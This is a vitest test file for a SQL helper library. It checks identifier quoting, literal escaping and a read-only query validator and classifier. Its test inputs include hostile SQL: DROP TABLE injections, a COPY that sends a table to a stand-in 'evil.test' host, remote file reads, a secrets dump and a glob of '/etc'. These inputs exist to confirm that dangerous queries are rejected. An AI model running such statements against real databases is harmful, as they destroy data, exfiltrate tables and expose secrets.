import fc from 'fast-check';
import { describe, expect, it } from 'vitest';
import { classifySqlStatement, ident, lit, validateReadOnlySql } from './index';

describe('@dewpond/sqlkit', () => {
  it('quotes hostile identifiers and unicode safely', () => {
    expect(ident('"; DROP TABLE x; --')).toBe('"""; DROP TABLE x; --"');
    expect(ident('🦆 emoji "col"')).toBe('"🦆 emoji ""col"""');
    expect(() => ident('')).toThrow(RangeError);
    expect(() => ident('bad\0col')).toThrow(RangeError);
  });

  it('property-tests ident() preserves balanced doubled double-quotes for arbitrary NUL-free strings', () => {
    const nulFreeString = fc.string().filter((s) => s.length > 0 && !s.includes('\0'));
    fc.assert(
      fc.property(nulFreeString, (raw) => {
        const quoted = ident(raw);
        expect(quoted.startsWith('"')).toBe(true);
        expect(quoted.endsWith('"')).toBe(true);
        const unquoted = quoted.slice(1, -1).replaceAll('""', '"');
        expect(unquoted).toBe(raw);
      }),
    );
  });

  it('escapes SQL literals deterministically', () => {
    expect(lit(null)).toBe('NULL');
    expect(lit(true)).toBe('TRUE');
    expect(lit(false)).toBe('FALSE');
    expect(lit(42)).toBe('42');
    expect(lit(-0)).toBe('0');
    expect(lit(9007199254740993n)).toBe('9007199254740993');
    expect(lit("O'Reilly")).toBe("'O''Reilly'");
    expect(() => lit(Number.NaN)).toThrow(RangeError);
    expect(() => lit(Number.POSITIVE_INFINITY)).toThrow(RangeError);
    expect(() => lit('a\0b')).toThrow(RangeError);
  });

  it('allows single SELECT and WITH queries while rejecting side-effects, secrets, and remote URIs', () => {
    expect(validateReadOnlySql('SELECT 1 AS x;')).toEqual({ ok: true });
    expect(
      validateReadOnlySql(
        `/* header */ WITH base AS (SELECT "id", 'a;b' AS txt FROM "users") SELECT * FROM base -- end`,
      ),
    ).toEqual({ ok: true });

    const dangerousQueries = [
      'COPY users TO "out.csv"',
      "SELECT * FROM read_csv('https://evil.example/data.csv')",
      "SELECT * FROM read_parquet('s3://bucket/a.parquet')",
      'SELECT * FROM duckdb_secrets()',
      "SELECT * FROM glob('/etc/*')",
      "SELECT * FROM read_csv('opfs://dewpond.db')",
      'INSTALL httpfs; SELECT 1',
      'SET enable_external_access = true',
      'PRAGMA version',
      'SELECT 1; DROP TABLE users',
      'SELECT "https://unquoted" FROM x',
    ];

    for (const q of dangerousQueries) {
      const res = validateReadOnlySql(q);
      expect(res.ok, `Expected rejection for: ${q}`).toBe(false);
    }
  });

  it('classifies hostile external IO vs DDL vs valid read-only SQL', () => {
    expect(classifySqlStatement('WITH c AS (SELECT 1 AS a) SELECT * FROM c').kind).toBe(
      'read_only',
    );
    expect(classifySqlStatement("COPY t TO 'https://evil.test/exfil.csv'").kind).toBe(
      'external_io',
    );
    expect(classifySqlStatement("SELECT * FROM read_parquet('opfs://secret.parquet')").kind).toBe(
      'external_io',
    );
    expect(classifySqlStatement("SELECT * FROM glob('/*')").kind).toBe('external_io');
    expect(classifySqlStatement('CREATE TABLE evil AS SELECT 1').kind).toBe('ddl_or_dml');
    expect(classifySqlStatement("SELECT 'ok'\0").kind).toBe('invalid');
  });
});
